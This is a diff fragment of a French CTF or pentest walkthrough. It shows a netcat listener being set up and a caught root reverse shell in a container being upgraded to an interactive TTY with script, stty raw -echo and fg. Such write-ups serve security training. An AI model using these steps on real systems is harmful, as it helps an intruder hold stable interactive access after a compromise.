@@ -15,3 +15,16 @@ Nous pouvons vérifier quels paramètres doivent être spécifiés en utilisant�
 
 Un écouteur netcat peut être configuré pour écouter la connexion en utilisant :
 `nc -nvlp 3155`
+
+
+obtenir un meilleur Shell 
+
+```
+root@3a453ab39d3d:/backend# script /dev/null -c bash 
+script /dev/null -c bash Script started, file is /dev/null root@3a453ab39d3d:/backend# ^Z [1]
++ Stopped nc -lnvp 443 
+oxdf@hacky$ stty raw -echo; fg 
+nc -lnvp 443 
+reset r
+eset: unknown terminal type unknown Terminal type? screen root@3a453ab39d3d:/backend#
+```
